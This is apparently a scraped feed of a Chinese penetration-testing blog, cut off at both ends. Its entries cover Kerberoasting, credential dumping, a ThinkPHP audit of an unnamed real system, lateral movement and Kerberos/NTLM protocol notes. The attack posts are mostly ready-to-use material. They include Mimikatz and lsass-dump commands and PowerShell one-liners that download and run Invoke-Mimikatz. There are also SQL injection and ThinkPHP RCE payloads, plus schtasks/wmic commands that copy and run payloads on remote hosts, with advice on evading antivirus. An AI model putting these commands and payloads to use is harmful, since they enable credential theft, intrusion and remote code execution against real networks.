http://msdn.microsoft.com/en-us/library/cc422926(v=prot.13) [+] 通过 Kerberos TGS [服务访问票据] 离线爆破 参考链接: Kerberoasting服务票据离线爆破密码 # spn“服务主体名称”是什么？ # 服务帐户利用SPN支持Kerberos身份验证。也就是说，当客户端需要访问sever提供的服务的时候，那么就需要使用spn查询有哪些服务。 # 这种spn扫描，是正常的，在内网中，客户端想要访问服务器的资源，都需要想DC域控查询服务主体名称。 基本方法： 通过Mimikatz导出票据TGS,文件后缀为Kirbi,命令：mimikatz.exe &quot;kerberos::list /export&quot; exit 关键点：实际环境MimiKatz进行免杀处理 离线爆破方式： # (1) 通过tgsrepcrack.py工具,进行服务票据爆破 # cmd： python2 tgsrepcrack.py password.txt loecho.Kirbi # (2) 通过kirbi2john.py将导出的loecho.kirbi转换为hashcat可以破解的格式，使用hashcat破解 # cmd： # 1. python2 kirbi2john.py python /usr/share/john/kirbi2john.py 2-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi &gt; output.txt （提取Kerberos tickets,结果output.txt的密码类型是Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]） # 2. 通过HashCat进行爆破： # cmd： hashcat -m 13100 output.txt pasword.txt --force # (3) 通过Invoke-Kerberoast（https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)导出票据，hashcat破解 # 执行没有任何结果 # import-module .\\Invoke-Kerberoast.ps1 # Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl # 提示没有AdminCount参数 # Invoke-Kerberoast -OutputFormat Hashcat | fl # Invoke-Kerberoast -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation [+] 键盘记录/屏幕截图获取关键的敏感记录 基本方法： 关键点： 实际使用中,免杀处理等一系列操作 Cobalt Strike 键盘记录，记录选择运维人员/管理人员的主机进行记录 屏幕截图 [+] 密码搜集 比如从LDAP中搜集各类密码/从已控主机搜各类软件存储的密码 [+]ms14-68 Kerberos 协议漏洞利用 [漏洞太老，实际中遇到较少] 1、PyKEK 最先公开的利用方法是Sylvain Monné用Python实现的PyKEK 准备条件： 域用户及其口令 域用户对应sid 域控地址 Win7及以上系统 Tips： 操作系统要求Win7及以上，这是因为XP不支持导入Ticket 攻击主机可使用其他域用户信息，比如可以在主机A上用域用户B的口令及sid攻击 将Python脚本转成exe即可在任意一台Windows主机使用 漏洞利用的步骤为： 如果漏洞触发成功，会生成.ccache文件 通过klist purge先清除内存中的Ticket 使用mimikatz的ptc功能将.ccache导入到内存 通过klist查看导入的Ticket 使用net use 连接域控 Tips： 如果不先清除内存中的Ticket直接导入，有可能会失败 连接域控要使用域控地址，不要用IP 2、kekeo Benjamin DELPY用c实现了MS14-068的利用工具，更简单高效。 因为域用户对应sid本就可以通过程序自动获取，清除导入票据也能自动实现，当然，如果想用其他域用户信息攻击，也可以加上sid手动导入票据 kekeo的快捷用法仅需要以下参数： 域用户及其口令 域控地址 3. 通过提权exp，直接从普通域用户提权到域管理员用户 [+]借助各类基础服务漏洞进行密码Hash抓取 参考链接:参考链接: Windows本地hashdump备忘录 项目推荐: https://github.com/TheKingOfDuck/hashdump 基本原理： 通过各种方式，不管是在线还是离线基本原理都是对Windows的Lsass.exe进行内存读取/或者是通过读取SAM数据库,提取出里面存储的用户Hash [+] 工具直接Dump： Mimikatz（实际环境处理特征/重新编译）运行条件: 高权限 # 编译有俩个版本，根据目标环境不同选用不同版本 # mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; QuarksPwDump 运行条件: 高权限 wce.exe -w 运行条件: 高权限 [+] Dump内存文件/导出SAM数据库，后续通过工具解密 REG+Mimikatz reg save hklm\\sam .\\sam.hive&amp;reg save hklm\\system .\\system.hive # 导出文件 # 1.解密文件，导入SAMInside，复制NT-Hash进行碰撞/查询 # 2.找自己测试机，通过Mimikatz离线读取，进行数据读取 lsadump::sam /sam:sam.hive /system:system.hive Procdump(微软官方程序)+Mimikatz # Procdump.exe -accepteula -ma lsass.exe lsess.dmp # 导出lsass内存文件 # 通过Mimikatz进行载入/读取： # minidump lsass.dmp # 切换文件 # sekurlsa::logonPasswords full # 导出hash/密码 无文件DumpHash,远程加载Powershell脚本 powershell &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds&quot; powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TheKingOfDuck/hashdump/master/procdump/procdump.ps1');Invoke-Procdump64 -Args '-accepteula -ma lsass.exe lsass.dmp'&quot; 尝试根据之前搜集汇总的密码/字典进行精确爆破SMB ","link":"https://1oecho.github.io/Net-05/"},{"title":"代码审计: 某Thinkphp系统审计","content":"0x01 开始： [+] 基本信息： Thinkphp5.0.5 存在WAF，貌似是某武盾 某费业务系统 [+] 关键点： 在得到目标域名时，结合目公司名称关键字,还有域名的关键字，试着与敏感的备份文件简单组合一下，得到简单的敏感文件字典，字典大致格式为,进行简单的目录扫描，手动去测试逻辑部分，不一会儿目录扫描结果得到业务系统的备份文件，名称为: 关键字+backup.tar.gz： 关键字+buckup.zip 关键字+buckup.rar 关键字+buckup.zip.tar 关键字+buckup.tar.gz www+关键字.zip www+关键字.rar www+关键字.zip.tar www+关键字.tar.gz 关键字.zip 关键字.rar 可以随意组合即可，也可以看一下参数命名方式，猜测管理员的命名习惯..... 0x02 代码审计 系统是由ThinkPHP5.0.5进行二次开发而搭建的，因为以前只是简单看过ThinkPHP代码，并不了解Thinkphp，google了一下，对应目录结构，看一下代码： [+] 系统路由： [+] SQL注入漏洞 身份证号处： （1）正常传参： 对输入没有任何限制，只是前端限制了输入长度，抓包后，随便传个id，就得到个人数据 （2）注入测试 存在WAF，后端数据库为MySQL，ThinkPHP-dubug 也没有开启，简单构造盲注证明一下危害即可： Payload: 查询user长度，长度为14： POST /index/index/p_card.html HTTP/1.1 Content-Length: 59 Accept: application/json, text/javascript, */*; q=0.01 DNT: 1 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.3538.77 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6 Connection: close card=1&quot;)/(case when length(user())=0 then 1 else 0 end)+--+ 查询内容，因为ascii函数拦截，替换为char函数，缺点是大小写不敏感，用 like binary代替： Paylaod: POST /index/index/p_card.html HTTP/1.1 Content-Length: 71 Accept: application/json, text/javascript, */*; q=0.01 DNT: 1 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.3538.77 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,en-US;q=0.7,en;q=0.6 Connection: close card=3&quot;)/(case when substr(user(),1,1)like binary 'a' then 1 else 0 end)+--+ 注个用户名证明下就可以了…. 看了其他代码之后都是一样的风格，注入有很多处…. 大同小异，都是直接拼接而且没有任何过滤 [+] THinkPHP RCE ThinkPHP老漏洞，因为目标有WAF自己的被动扫描也没效果，把代码过了一下，发现还是存在，本地搭起来可以复现，具体分析过程可以看y4er大佬博客,我自己跟了一下，结果如下 : **Paylaod: ** POST?s=index/index s=whoami&amp;_method=__construct&amp;method=POST&amp;filter[]=system aaaa=whoami&amp;_method=__construct&amp;method=GET&amp;filter[]=system _method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoami get[]=whaomi&amp;_method=__construct&amp;method=get&amp;filter=system 本地验证成功，WAF没绕过去,自己测试了一下发现WAF拦截的是filter关键字，没其他想法了，卒…. 前台功能点少，只有几个查询，没啥shell的点…. 太菜了… 总结一下所有SQL摸鱼完事… 0x03 参考链接 THINKPHP目录结构：https://www.kancloud.cn/manual/thinkphp5/118008 Thinkphp5.0.5 RCE 分析：https://y4er.com/post/thinkphp5-rce/ ","link":"https://1oecho.github.io/RealCode-01/"},{"title":"内网渗透：  横向渗透方法总结","content":"内网渗透： 横向渗透方法总结 0x01 基本横向方法： 横向方法 实现方法 远程计划任务，远程服务管理 $IPC远程操作实现目标上线 Dcom 远程执行 通过Com对象进行远程命令执行 Rdp 远程执行 RDP配合代码执行进行横向渗透 SSH 远程执行 MSF配合命令执行进行横向渗透 Mssql 远程执行 MSF配合Hash-dump模块，或者通过存储过程进行命令执行 Oracle 远程执行 Mysql 远程执行 Post gresql 远程执行 集控下发 各类 EDR 主控端 补丁服务器 SSP SSH 类后门 别名记录 各类 Java 中间件 RCE Nday Tomcat,ActiveMQ,Weblogic,Jenkins,shiro,fastjson MSF配合各类中间件利用工具 IIS6.0 Webdav RCE &amp; PUT 利用中间件漏洞RCE实现横向 OWA CVE 2020 0688 CVE 2019 0708 3389漏洞利用 MS17 010 永恒之蓝利用 MS08 067 Rsync 写文件 通过文件同步 NFS 错误配置 内网钓鱼 利用内部 邮件 OA 聊天工具 社工 FTP /NAS 挑 文件绑马替换 DNS 劫持 挂马 钓鱼 Rdp 反向劫持 条件苛刻 通过收集的敏感信息横向 实现方法 个人机浏览器 Web 密码 抓取 找上传 传 shell 常规WEB渗透，寻找关键系统getshell 抓取各类三方工具客户端 [Xshell,SecureCRT,Navicat,SSMS,PLSQL,Filezilla,xftp密码 获取敏感信息，进行密码收集，定点横向 MS14 068 通过漏洞获取域控权限 服务票据爆破 域内服务暴力破解 Ldap 喷射 通过工具进行Ldap喷射 绑定登录脚本 通过域控进行设定登陆脚本 EDR下发策略 各类高权限的恶意策略下发 0x02 具体实现步骤 [+] 远程计划任务 前提条件： 1.必须通过其他手段拿到本地或者域管理账号密码 2.若在横向渗透过程中，要保证当前机器能net use远程到目标机器上 3.目标机器开启了task scheduler服务,正常运行Task Scheduler 具体步骤： XP/2003以下版本利用方式 net use \\\\10.10.10.10\\admin$ /user:&quot;administrator&quot; !QAZ2wsx # net use net time 10.10.10.10 # 查看 远程 windows 机器时间 xcopy Patches.exe 192.168.3.102 admin$ temp # 把 payload拷到远程机器的某个临时目录下 at 192.168.3.102 19:30 /every:5,6,7,10,18,19,21,24,28 windows temp Patches.exe # 开始在 远程 机器 上创建计划任务 只 在 每个月 的这几天的晚上七点半 准时 执行 指定 的 payload at 192.168.3.102 # 查看 远程机器上的 所有 计划任务 列表 at 192.168.3.102 /delete /yes # 删除 远程机器上的所有计划任务 也可以 用 指定 id 的 方式 删除 单条 计划任务 net use 192.168.3.102 admin$ /del # 用完 以后 立即 删除 该 ipc 连接 通过IPC共享木马文件，先查看目标时间： Windows 7/windows 2003 以上 具体操作流程 net use \\\\192.168.3.108\\admin$ /user:&quot;administrator&quot; &quot;admin!@#45&quot; net time \\\\192.168.3.108 xcopy c:\\rev.bat \\\\192.168.3.108\\admin$\\temp\\ chcp 437 # 如果目标是中文系统,最好先调整下字符集,不然会有问题 schtasks /create /s 192.168.3.108 /u &quot;administrator&quot; /p &quot;admin!@#45&quot; /RL HIGHEST /F /tn &quot;WindowsUpdates&quot; /tr &quot;C:/Windows/temp/bit.exe&quot; /sc DAILY /mo 1 /ST 20:15 #在远程的目标机器上创建计划任务 schtasks /run /tn WindowsUpdates /s 192.168.3.108 /U &quot; administrator&quot; /P &quot;admin!@#45&quot; # 创建完以后,远程手动运行 schtasks /query /s 192.168.3.108 /U &quot;administrator&quot; /P &quot;admin!@#45&quot; | findstr &quot;WindowsUpdates&quot; # 运行完以后,随手检查运行状态 schtasks /delete /F /tn WindowsUpdates /s 192.168.3.108 /U &quot; administrator&quot; /P &quot;admin!@#45&quot; # 一般情况下,在我们拿到远程机器shell 以后,立即删除远程机器上的计划任务即可 [+] Dcom 远程执行 前提条件： 1.必须拥有管理员权限，目标机开启共享且关闭防火墙 2.若在域内环境横向渗透过程中，要保证当前机器获取了域管理员证书 具体步骤： [+] RDP 横向渗透 前提条件： 1.在拿下一台机器后，Dump-Hash之后得到明文密码，结合本机信息猜测其他机器密码，进行横向（动静较大） 2.拥有管理员权限或者RDP组权限 3.通过RDP成功连接时，执行程序实现横向渗透 具体步骤： （1）密码规则猜测，或者弱口令直接撞3389（工作组环境） 假设拿到DMZ区域的WEB服务器,DumpHash后，获得密码格式 # IP： 10.10.10.130 密码： ABCD130!@. # 仔细划分为三部分： # ABCD 目标公司名称简称 # 130 目标系统IP的C段地址 # !@. 密码策略问题，加的特殊字符 # 由此可以猜测主机内其他机器管理员密码情况，从而定点横向，从WEB到数据库从数据库到核心。。。。 （2） 通过高权限用户配合高密码进行横向RDP喷射 高权限域用户，Dump到明文密码，3389端口开启： RDP端口查看方式： # 通过注册表查询3389 REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections # 查看RDP服务是否开启：1关闭，0开启 REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v PortNumber # 查看RDP服务的端口 # 通过进程查看 tasklist /svc | find &quot;TermService&quot; # 找到对应服务进程的PID netstat -ano | find &quot;3220&quot; # 找到进程对应的端口号 # 通过监听端口查看 netstat -ano | findstr LIS # 查看当前监听端口，有些情况可能RDP端口更改 强开RDP端口方法: # 注册表开启，高权限用户： REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f REG ADD &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f # 监听 3389 端口 # 注册表文件开启，高权限用户： Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server] &quot;fDenyTSConnections&quot;=dword:00000000 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp] &quot;PortNumber&quot;=dword:00000d3d # Wmic启动远程主机RDP服务： wmic /node: &quot;10.10.10.130&quot; /USER:&quot;10.10.10.130\\administrator&quot; PATH win32_erminalservicesetting WHERE (__Class!=&quot;&quot;) CALL SetAllowTSConnections 1 # 需要输入远程机器上管理员密码 后续通过一些RDP爆破工具，进行爆破，前提是已经进行过3389端口的扫描得到结构,以免动静太大，效率太低！ [+] SMB 横向渗透 前提条件： 1.获取到目标机器的明文密码/NTLM-Hash 2.若在工作组内进行SMB的爆破，目标机器开启445端口，开启admin目录共享，以及密码正确 常用方法： 1.基础的手动进行IPC连接，实现横向 2.通过msf自带的psexec 模块进行横向 3.通过CrackMapexec进行横向渗透 4.通过计划任务进行smb的爆破，实现横向渗透 5.目标开启135端口，通过WMI进行命令执行，实现横向 6.通过powershll脚本实现PTH,进行横向渗透 基本步骤： 工具地址： https://github.com/maaaaz/CrackMapExecWin https://github.com/byt3bl33d3r/CrackMapExec 以CrackMapExec为例,通常情况下，有Python版本的编译的exe版本，实战时要修改特征，如果要落地到目标机器，注意免杀！例子：工作组环境下的利用： 首先先通过手中的机器,dump到Hash或者明文密码，为了效率问题，针对已知网段的445端口进行探测，保存结果： crackmapexec.exe -d . -t 10 172.16.0.0/16 探测后的结果，通过手中的密码/Hash去撞一下机器,顺便获取登陆成功后的机器的Hash，为后续做准备： for /f &quot;delims=&quot; %i in (C:\\windows\\temp\\ip.txt) do @crackmapexec.exe -d . -u administrator -p ！QAZ@WSX 1 --sam % 筛选Hash后续进行，第二次传递，实战中可以通过计划任务，配合免杀的MimiKatz进行抓取明文密码： [+] SMB 横向渗透 基于wmic的横向渗透，目标防火墙关闭，开启135端口 beacon&gt;shell net use N10.7.6.30\\admin$ /user:&quot;administrator&quot;&quot;xxxx@1234&quot; beacon&gt;shell copy SysDebug.exe N10.7.6.30ladminS\\debug\\ beacon&gt;shell wmic/NODE:&quot;10.7.6.30&quot;/user:&quot;administrator&quot;/password:&quot;xxxx@1234&quot; PROCESS call create&quot;c:\\windows\\debug\\SysDebug.exe&quot; beacon&gt;shell del \\10.7.5.25\\admin$\\debug\\SysDebug.exe/F beacon&gt;shell net use\\10.7.6.30ladmin$/del SMB碰撞 shell for/f &quot;delims=&quot; %i in(D:/用户文档/yanc/Contacts/all.txt)do SysLog.exe-h%i user.txt pwd.txt&gt;&gt;sys.logs 基于IPC的横向渗透，目标445端口开放： beacon&gt;shell net use \\\\10.ip.ip.ip\\admin$ /user:&quot;administrator&quot; &quot;password&quot; beacon&gt;shell copy debug.exe \\\\10.ip.ip.ip\\admin$\\debug\\ beacon&gt;shell wmic /NODE:&quot;10.ip.ip.ip&quot; /user:&quot;administrator&quot; /password:&quot;passsword&quot; PROCESS call create &quot;c:\\windows\\debug\\debug.exe&quot; beacon&gt;shell del \\\\10.ip.ip.ip\\admin$\\debug\\debug.exe /F beacon&gt;shell net use \\\\10.ip.ip.ip\\admin$ /del ","link":"https://1oecho.github.io/Net-6/"},{"title":"内网渗透： 域认证Kerberos协议分析记录","content":"0x01 Kerbroes认证流程分析： 域认证所参与的角色 Client（客户端） Server（服务端） KDC (Key Distribution Center) = DC AD (Accent Database): 存储所有client的白名单，只有存在Celient才能申请到TGT AS： 为Client生成TGT的服务 TGS：为Client生成某个服务ticket Kerberos认证名词： AS：⾝份认证服务(验证 Client⾝份) KDC：密钥分发中⼼(域内最重要的服务器,域控制器) TGT：票据中⼼，⽤⼾信授予的票据(访问TGS服务的票) TGS：票据授权服务 ST：访问服务的票据Krbtgt：每个域中都有 krbtgt账⼾,此账⼾是KDC的服务账⼾⽤来创建TGT Principal：认证主体 PAC：特权属性证书(⽤⼾的SID,⽤⼾所在的组) SPN：服务主体名称 Session Key：（临时会话密钥a，只有 Client和TGS知道，在 Kerberos认证中⾄关重要） Server Session Key：（临时会话密钥b,只有 Client和 Service知道,在 Kerber认证中⾄关重要) 0x02 具体流程分析： 一. Client向KDC-AS申请TGT (1)Requests请求： Client-&gt;KDC-AS(AS-REQ)，客⼾端请求KDC（域控）的AS服务（⾝份认证服务）发送如下数据： 客⼾端⽤⼾名（user's Username） 服务端⽤⼾名（krbtgt service） 随机数（A Nonce）由客⼾端⽣成 (2)Response回应： KDC-AS-&gt;Client (AS-REP)，KDC处理信息并且回复Client ⾝份认证服务（KDC-AS）使⽤⽤⼾的NTLM Hash解密时间戳，解密成功后检查⽤⼾的信息（登陆限制，组成员⾝份等）并创建TGT 向本地LSA（Local Security Authority）请求⽣成⼀个特殊的数据PAC（权限属性证书，使⽤krbtgt密钥进⾏签名）KDC随机⽣成⼀个短期会话密钥（Session Key），此时AS向Client发送两条消息（AS-REP） TGT（使⽤krbtgt NTLM Hash加密），有效期为10⼩时，内容包含： ⽤⼾名（User name） 零时会话密钥（Session Key） 特权属性证书（PAC）由krbtgt签名 TGT的⽣命周期 T(C)使⽤Client申请TGT时使⽤的⽤⼾名对应的NTLM Hash加密，内容包含： TGT⽣命周期 零时会话密钥（Session Key） 随机数（A Nonce） 二. Client拿TGT请求KDC的TGS服务拿到ST （1）Client-&gt;KDC-TGS(TGS_REQ)，Client拿TGT请求KDC的TGS服务拿到ST Client： 使⽤NTLM Hash解密T(C)获得Session Key Client 向TGS发送消息： （1）Authenticator（使⽤Session Key加密），内容包含： Client Name Timestamp（正负5分钟) （2）TGT（使⽤krbtgt hash加密） Session Key （3）所需的SPN（服务主体名称） （4）A Nonce（随机数） KDC： KDC使⽤Krbtgt NTLM Hash 对TGT解密，获取Cilent信息和Session Key 使⽤Session Key对Client发来的Authenticator信息进⾏解密，对⽐TGT信息 （2 ）KDC-TGS-&gt;Client（TGS_REP） KDC: TGS⽣成Server Session Key TGS⽣成Client 需要访问服务的ST发送给Client，Ticket使⽤⽬标服务账⼾的NTLM Hash加密： (1)Client Name (2)Server Session Key (3)PAC(krbtgt hash签名) (4)TGS(⽣命周期) 使⽤Session Key加密的Server Session Key，内容如下： (1)A Nonce (2)TGS⽣命周期 (3)Server Session Key ⽤⼾名 Client： Client 收到信息后，使⽤Session Key解密获得Server Session Key 三、Client拿着ST访问Server Client-&gt;Server (AP-REQ) Client: （1） Client发送由Server Session Key 加密的Authenticator信息和ST,访问Server， 内容如下： (1) ST (2) Timestamp (3) Client Name (2) ST(Server NTLM Hash加密) (1) Server Session Key (2) Client Name Server-&gt;Client（AP-REP） Server: （1 ）Server使⽤NTLM Hash解密ST，获得Server Session Key，使⽤ Server Session Key解密Authenticator信息，对⽐Authenticator信息中的Client信息和Ticket中的Client信息对⽐，将Authenticator信息的时间戳和Ticket的时 间戳是否相同（+/-2分钟） (2） Server使⽤Server Session Key 加密Authenticator信息，其内容为： (1) ID (2) 时间戳 Client： 1 . Client使⽤缓存中的Server Session Key解密Authenticator信息，得到该访问需要携带的ID和时间戳。 2 . 认证完成，只需要使⽤申请的Service Ticket就可以正常访问服务。 0x03 体会总结： 感谢好兄弟的笔记，配合自己的抓包分析，学到了很多 把握关键点，配合攻击手段，针对认证的不同环境进行攻击 努力学习，早日脱菜！ ","link":"https://1oecho.github.io/Net-5/"},{"title":"内网渗透： NET-NTLM认证流程分析记录","content":"0x01 具体流程 分析步骤： 1. 通过域内机器对域控进行目录共享访问 2. 通过WireShake进行数据包抓取 3. 把认证流程一步一步分析，一发一收 具体操作： WireShake抓取VM-Ware的虚拟网卡： 域内机器对域控进行共享目录操作： 请求数据包分析： 0x02 关键步骤分析 质询过程中的四个请求： 主机的基础信息进行发送，服务端查找后与对应用户名的ntlm+16为随机字符，生产challenge1，发送给客户端： 请求 Requests： 响应 Response: 客户端收到Challenge与NTLM加密生成Response发送给服务端 请求 Requests: 服务端进行判断比较，返回相对应结果 响应 Response:（登陆成功的响应！） 0x03 常见环境区别： 工作组认证和域环境认证的区别： 工作组：点对点交易，无法相互信任 域环境：有信托机构(域)，通过信托来进行认证流程 ","link":"https://1oecho.github.io/Net-04/"},{"title":"内网渗透：Widows认证学习记录","content":"00. 密码存储路径： %SystemRoot%\\system32\\config\\sam 流程： 输入密码与Sam进行对比 Sam： 存储windows ntlm 01. NTLM （NT LAN Manager ）hash ntlm Hash 是支持Net NTlm认证新协议及本地认证过程中重要参与物，长度为32，由数字贺字母组成 WIndows 不存储用户的明文密码，只存储ntlm，后续对产生的ntlm与sam文件中的ntlm进行比较 NTLM 前 版本为：LM_Hash (Windows XP WIndows 2003) 02. NTLM 生成： 基本流程： 字母转hex(十六进制) 十六进制转Unicode unicode 通过 md4 加密得到ntlm，最终生成结果为：32位： 实现代码： # poc-t 框架下，流程生产： #!/usr/bin/env python # -*- coding: utf-8 -*- ''' @Name: getntlm.py @Author: loecho @Email: 1loechome@gmail.com @Blog: https://www.loecho.me @Time: 2020/7/23 17:58 ''' import hashlib, binascii def poc(password): ntlmHash = binascii.hexlify(hashlib.new('md4', password.encode('utf-16le')).digest()) with open(r'ntlmHash.txt', 'a')as f: f.write(ntlmHash+'\\n') return '[+] htlmHash: ' + ntlmHash #print ntlmHash # return '[+]'+ password+'\\t'+'[+]' + ntlmHash # 直接调用库生产： Python 3.7.9 (tags/v3.7.9:13c94747c7, Aug 17 2020, 16:30:00) [MSC v.1900 64 bit (AMD64)] on win32 Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information. &gt;&gt;&gt; from passlib.hash import nthash &gt;&gt;&gt; ntlm_hash = nthash.hash('loecho') &gt;&gt;&gt; ntlm_hash '659ff5f9cbeaef25947510fab544cfee' &gt;&gt;&gt; POC-T 生成： Administrator !@#tools9012#@! B700A mimikatz 10.6.19.12 1598925126465 直接生成： 03. LM-Hash 小写转大写字母 密码未达到七位，填充14位，每8比特填充0 由于DES加密，Key位硬编码,单次DES，安全性低 DES结果脆弱，较容易被破解猜解 04. 本地认证流程： WIndows Logon Process ，接受输入 LSASS，对输入进行认证处理 05. Windows 网络认证： 内网渗透，工作组环境，只能点对点认证 内网渗透，域环境，NTLM认证协议 NTLM 协议： SMB协议，早期为明文口令 WindowsNT挑战/相应验证机制，最新NTLMv2 挑战（Challenge）/响应（Response） 协议协商 客户端---&gt;服务端：信息包含用户名 服务端查找后与对应用户名的ntlm+16为随机字符，生产challenge1，发送给客户端 客户端接收challenge，使用对应NTLM Hash 加密Challenge生产Response，发送至服务端 NTLM v2 协议 NTLM v1 与 NTLM v2 最显著的区别就是Challenge与加密算法不同 CHallenge: NTLM v1 的Challenge有8位， NTLM v2的Challenge位16位 Net-NTLM Hash： NTLM v1的主要加密算法DES NTLM v2的主要加密算法HMAC-MD5 Responder smbexec Pass The Hash （哈希传递） 不需要账号密码，获得认证的过程 必要条件： 互通 认证的用户名 需要NTLM Hash Active Directory（活动目录）概念 服务器及客户端计算机管理 用户服务 资源管理 桌面配置 应用系统支持 域认证体系 - Kerbroes Kerberos是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被 任意地读取、修改和插入数据。在以上情况下，Kerberos作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享 密钥）执行认证服务的。 域认证所参与的角色 Client Server KDC (Key Distribution Center) = DC AD (Accent Database): 存储所有client的白名单，只有存在Celient才能申请到TGT AS： 为Client生成TGT的服务 TGS：为Client生成某个服务ticket 认证流程： 针对获得到NTLM Hash的服务 Mimikatz 针对单一服务进行伪造 DCSync 域同步 ---&gt; LDAP ","link":"https://1oecho.github.io/Net-00/"},{"title":"小工具: All-in-XrayScan","content":"0x01 目的 为了实现批量的，廉价的Xray高级版扫描器，主要是利用Rad爬虫，和360爬虫相比感觉Rad相对更强大，所以就简单实现一下基本功能，后续再继续添加新功能 0x02 版本介绍 _ __ ____ __ _____ | |/ /_________ ___ __/ __ \\____ _____/ / / ___/_________ _____ | // ___/ __ `/ / / / /_/ / __ `/ __ /_____\\__ \\/ ___/ __ `/ __ \\\\ / |/ / / /_/ / /_/ / _, _/ /_/ / /_/ /_____/__/ / /__/ /_/ / / / / /_/|_/_/ \\__,_/\\__, /_/ |_|\\__,_/\\__,_/ /____/\\___/\\__,_/_/ /_/ /____/ Version: v1.0 Author: loecho Blog: https://loecho.me Usage： 扫描效果： [1] 全类型漏洞批量扫描： [2] 单类型漏洞扫描： 脚本总共俩个版本： XrayRad-Scan： 为高级版用户所用，利用Xray高级版，进行批量爬取及扫描！ XrayRad：为社区版用户所用，利用Rad和Xray进行批量爬取 具体配置文件看代码就懂了，爬取结果保存为漏洞出现时间格式！ 没啥技术含量，大佬勿喷！ 0x03 To do 后续将多类型爬虫都集合 在配合多个被动扫描，主动扫描 各类结果的容错处理 ","link":"https://1oecho.github.io/ZE5av21E3/"},{"title":"内网渗透： 资源定位及攻击思路","content":"参考： 许多干货都是大佬的大佬提供，在实践过程中，要逐步完善为自己的！ 0x01 基础信息收集 01.WebShell 层面的信息收集： # 当前权限用户的具体确认 whoami /user # 查看当前用户 whoami /priv # 查看具体权限 query user # 查看当前登录用户 net user name # 查看name用户具体信息 net user # 当前用户 net localgroup administrators # 查看administrtor组内的具体用户 # 当前主机的具体网络情况 ipconfig /all # 查看当前IP，判断是否存在域环境 ping t.com # 判断网络ICMP是否出网 arp-a # 查看ARP-p缓存 netstat -ano # 查看本机当前端口情况 TRACERT -d -h 10 ip # 判断网络出网跳数，从而判断网络结构 net use # 判断是否存在IPC连接 net share # 判断共享目录 # 主机信息及软件进程排查 wmic OS get Caption,CSDVersion,OSArchitecture,Verion # 当前系统具体信息 wmic product get name,version # 查看当前软件安装的具体名字以及版本，后续要对各类软件进行敏感信息收集 systeminfo # 查看补丁情况，为提权做准备,后续提权做准备 tasklist /svc # 查看当前进程，判断是否存在杀软 net start # 当前服务启动情况 set # 判断当前计算机存在的环境变量，后续使用 powershell &quot;Get-WmiObject -class Win32_Product | Select-Object -property name,version&quot; # 通过powershell获取 # 后续通过结合已知信息进行CS，或MSF上线！ 02.CS/MSF 阶段的信息收集： # 收集域环境信息 net view # 获取当前域或工作组部分在线机器 net group &quot;domain computer&quot; /domain # 域内存活机器的探测方式 net view /domain # 获取当前内网下的所有工作组和域名 net view /domain:DC # 获取域或工作组的主机列表 # 通过Linux命令进行主机名提取，为后续主机存货以及网络结构探测做准备 awk -F &quot; &quot; {'print $1'} list.txt &gt;&gt; name.txt awk -F &quot; &quot; {'print $2'} list.txt &gt;&gt; name.txt awk -F &quot; &quot; {'print $3'} list.txt &gt;&gt; name.txt # 通过主机名，进行批量Ping，判断网络结构，以及各类主机功能 for /f &quot;delims=&quot; %i in (name.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;mark.com&quot; &gt;&gt; retult.txt # 批量Ping type C:\\HOST-ASP\\MTI\\Styles\\mactoip.txt # 查看结果 # 批量获取脚本bat @echo off setlocal ENABLEDELAYEDEXPANSION @FOR /F &quot;usebackq eol=- skip=1 delims=\\&quot; %%j IN (`net view ^| find &quot;命令成功完成&quot; /v ^|find &quot;The command completed successfully.&quot; /v`) DO ( @FOR /F &quot;usebackq delims=&quot; %%i IN (`@ping -n 1 -4 %%j ^| findstr &quot;Pinging&quot;`) DO ( @FOR /F &quot;usebackq tokens=2 delims=[]&quot; %%k IN (`echo %%i`) DO (echo %%k %%j) ) ) # 域内管理员定位： net user /domain net group &quot;domain admins&quot; 